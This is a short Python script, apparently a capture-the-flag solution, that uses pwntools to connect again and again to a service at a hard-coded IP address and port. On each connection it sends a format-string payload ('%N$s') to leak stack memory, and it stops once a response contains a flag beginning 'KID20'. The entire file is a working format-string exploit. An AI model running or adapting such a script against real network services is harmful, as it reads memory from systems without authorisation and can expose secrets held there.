from pwn import *
for i in range(100):
    io = remote('129.241.209.70', 29279)
    io.recvuntil('look?\n')
    io.sendline(f'%{i}$s')
    data = io.recvline()
    if b'KID20' in data:
        print(data)
        break
    io.close()